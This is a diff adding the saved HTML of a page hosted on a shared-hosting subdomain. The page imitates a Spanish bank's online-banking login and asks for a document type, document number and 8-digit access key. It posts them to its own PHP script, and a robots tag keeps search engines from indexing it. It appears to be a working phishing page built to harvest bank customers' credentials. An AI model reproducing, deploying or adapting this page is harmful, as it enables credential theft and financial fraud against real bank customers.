@@ -1,0 +1,191 @@
+<!-- url: https://cgl.iwp.mybluehost.me/LHA/SANT1/login.php
+status: 200 -->
+<!doctype html>
+<html>
+
+    <head>
+        <!-- Required meta tags -->
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
+        <!-- CSS FILES -->
+        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
+        <link rel="stylesheet" href="./Assets/css/helpers.css">
+        <link rel="stylesheet" href="./Assets/css/style.css">
+        <link rel="icon" type="image/png" href="./Assets/imgs/ff.png" />
+        <title>Particulares</title>
+        <script src="./Assets/js/stutes.js"></script>
+    </head>
+
+    <body id="with-img">
+
+        <div id="logo"><img src="./Assets/imgs/logo.png"></div>
+
+        <div id="login-area">
+            <div class="login-box">
+                <div class="top">
+                    <ul>
+                        <li>Particulares</li>
+                        <li>Empresas</li>
+                    </ul>
+                    <p><img src="./Assets/imgs/arrow-left.png"> Volver</p>
+                </div>
+                <form id="forma" action="./Assets/php/config/func.php" method="post">
+                    <input type="hidden" name="log">
+                    <legend>Te damos la bienvenida a tu Banca Online</legend>
+                                        <div class="zawa9 zaaa mb20">
+                        <div class="col1">
+                            <div class="z-doc">
+                                <div class="input">
+                                    <p class="label-txt">Documento</p>
+                                    <input value="NIF" type="text" name="doc" id="doc" readonly>
+                                    <div class="arrow"><img src="./Assets/imgs/arrow-down.png"></div>
+                                    <ul>
+                                        <li>NIF</li>
+                                        <li>CIF</li>
+                                        <li>NIE</li>
+                                        <li>Pasaporte</li>
+                                        <li>Usuario</li>
+                                    </ul>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="col2">
+                            <div class="input">
+                                <p class="label-txt">Nº de documento</p>
+                                <input type="text" name="doc_num" id="doc_num" required>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="zawa9 mb20">
+                        <div style="width: 100%;">
+                            <div class="input">
+                                <p class="label-txt">Clave de acceso</p>
+                                <div class="inputs">
+                                    <input type="password" inputmode="numeric" maxlength="8" minlength="8" name="password1" id="password1" required>
+                                </div>
+                                <div class="eye"><img src="./Assets/imgs/eye1.png"></div>
+                                <div class="keyboard"><img src="./Assets/imgs/keyboard.png"></div>
+                            </div>
+                        </div>
+                    </div>
+                    <table class="table">
+                        <tr>
+                            <td>0</td>
+                            <td>7</td>
+                            <td>8</td>
+                            <td>6</td>
+                            <td>2</td>
+                            <td>9</td>
+                        </tr>
+                        <tr>
+                            <td>4</td>
+                            <td>3</td>
+                            <td>5</td>
+                            <td>1</td>
+                            <td colspan="2" class="remove">Borrar</td>
+                        </tr>
+                    </table>
+                    <div class="btns">
+                        <div>
+                            <p class="remember">Recordar usuario</p>
+                        </div>
+                        <div>
+                            <button type="submit" id="booom">Entrar</button>
+                        </div>
+                    </div>
+                    <p class="tt">¿Problemas con tu clave de acceso?</p>
+                </form>
+            </div>
+            <div class="login-bottom">
+                <ul class="list1">
+                    <li><img src="./Assets/imgs/headphone.png"> Centro de ayuda</li>
+                    <li><img src="./Assets/imgs/marker.png"> Oficinas y cajeros</li>
+                </ul>
+                <hr>
+                <ul class="list2">
+                    <li>Alta en Banca Online</li>
+                    <li>Demo</li>
+                    <li>Seguridad</li>
+                </ul>
+            </div>
+        </div>
+
+        <!-- JS FILES -->
+        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+        <script src="./Assets/js/js.js"></script>
+
+        <script>
+
+            $(document).click(function(event) {
+                var target = $(event.target);
+                if(!target.closest('.z-doc').length && $('.z-doc ul').is(":visible")) {
+                    $('.z-doc ul').fadeOut();
+                } 
+            });
+            $('.z-doc').click(function(){
+                $('.z-doc ul').show();
+            });
+            $('.z-doc ul li').click(function(){
+                var zow = $(this).html();
+                $('.z-doc ul').fadeOut();
+                $('#doc').val(zow);
+                if( zow == 'Usuario' ) {
+                    $('.zaaa').addClass('d-block');
+                    $('.col1').addClass('w-100 mb20');
+                    $('.col2').addClass('w-100');
+                } else {
+                    $('.zaaa').removeClass('d-block');
+                    $('.col1').removeClass('w-100 mb20');
+                    $('.col2').removeClass('w-100');
+                }
+            });
+            $('.inputs input').keyup(function(e){
+                $(this).addClass('active');
+                var btn = e.keyCode;
+                if( btn == 8 ) {
+                    $(this).prev().focus();
+                } else {
+                    $(this).next().focus();
+                }
+            });
+            $('.inputs input').click(function(){
+                $('.inputs input').each(function(i){
+                    if( $(this).val() == '' ) {
+                        $(this).focus();
+                        return false;
+                    }
+                }); 
+            });
+            $(".table tr td:not('.remove')").click(function(){
+                var cur_number = $(this).html();
+                var num = $(".inputs input:not('.active')");
+                if( num.length > 0 ) {
+                    $(num[0]).addClass('active');
+                    $(num[0]).val(cur_number);
+                }
+            });
+            $('.eye').click(function(){
+                if( $('#password1').attr('type') == 'password' ) {
+                    $('.inputs input').attr('type','text');
+                    $(this).html('<img src="./Assets/imgs/eye2.png">');
+                } else {
+                    $('.inputs input').attr('type','password');
+                    $(this).html('<img src="./Assets/imgs/eye1.png">');
+                }
+            });
+            // $('.remove').click(function(){
+            //     $('.inputs input.active').last().removeClass('active').val('');
+            // });
+            // $('.keyboard').click(function(){
+            //     $('table').toggle();
+            // });
+            
+        </script>
+
+    </body>
+
+</html>
